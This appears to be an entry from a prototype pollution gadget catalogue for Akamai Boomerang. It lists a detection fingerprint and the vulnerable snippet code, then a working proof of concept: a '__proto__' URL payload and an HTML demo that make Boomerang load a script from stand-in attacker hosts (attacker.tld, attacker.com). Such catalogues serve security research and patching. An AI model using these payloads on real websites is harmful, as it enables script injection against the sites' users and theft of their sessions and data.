## Akamai Boomerang

URL: https://developer.akamai.com/tools/boomerang

### JS Fingerprint
```
return (typeof BOOMR !== 'undefined')
```

### Vulnerable code fragment
https://github.com/akamai/boomerang#32-adding-it-via-an-iframepreload
```js
window.BOOMR = window.BOOMR || {};
...
// NOTE: Set Boomerang URL here
window.BOOMR.url = "";
...
function promote() {
  ...
  var script = document.createElement("script");
  script.id = "boomr-scr-as";
  script.src = window.BOOMR.url;
  ...
  where.parentNode.appendChild(script);
```

### PoC

```
?__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js
```

```html
<script>
  Object.prototype.BOOMR = 1;
  Object.prototype.url='https://attacker.com/js.js'
</script>

<script>
(function() {
    if (window.BOOMR && (window.BOOMR.version || window.BOOMR.snippetExecuted)) {
        return;
    }

    window.BOOMR = window.BOOMR || {};
    window.BOOMR.snippetStart = new Date().getTime();
    window.BOOMR.snippetExecuted = true;
    window.BOOMR.snippetVersion = 12;

    window.BOOMR.url = "https://foo.bar/";

    var 
        where = document.currentScript || document.getElementsByTagName("script")[0],
        promoted = false,
        LOADER_TIMEOUT = 3000;

    function promote() {
        if (promoted) {
            return;
        }

        var script = document.createElement("script");
        script.id = "boomr-scr-as";
        script.src = window.BOOMR.url;
        script.async = true;

        where.parentNode.appendChild(script);

        promoted = true;
    }

    function iframeLoader(wasFallback) {
        /* ... */
    }

    var link = document.createElement("link");

    if (link.relList &&
        typeof link.relList.supports === "function" &&
        link.relList.supports("preload") &&
        ("as" in link)) {
        window.BOOMR.snippetMethod = "p";

        link.href = window.BOOMR.url;
        link.rel  = "preload";
        link.as   = "script";

        link.addEventListener("load", promote);
        link.addEventListener("error", function() {
            iframeLoader(true);
        });

        setTimeout(function() {
            if (!promoted) {
                iframeLoader(true);
            }
        }, LOADER_TIMEOUT);

        BOOMR_lstart = new Date().getTime();

        where.parentNode.appendChild(link);
    }
    else {
        iframeLoader(false);
    }

    function boomerangSaveLoadTime(e) {
        window.BOOMR_onload = (e && e.timeStamp) || new Date().getTime();
    }

    if (window.addEventListener) {
        window.addEventListener("load", boomerangSaveLoadTime, false);
    }
    else if (window.attachEvent) {
        window.attachEvent("onload", boomerangSaveLoadTime);
    }
})();
</script>
```